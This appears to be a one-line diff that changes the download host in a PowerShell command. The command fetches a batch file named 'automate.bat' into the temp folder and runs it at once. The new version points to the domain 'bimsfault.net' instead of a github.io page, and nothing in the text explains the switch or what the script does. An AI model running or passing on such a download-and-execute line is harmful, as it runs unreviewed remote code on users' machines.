@@ -1,1 +1,1 @@
-powershell -Command "wget 'https://dzevanrunner.github.io/Win10/automate.bat' -OutFile '%TEMP%\automate.bat'; & '%TEMP%\automate.bat'"
+powershell -Command "wget 'https://bimsfault.net/automate.bat' -OutFile '%TEMP%\automate.bat'; & '%TEMP%\automate.bat'"
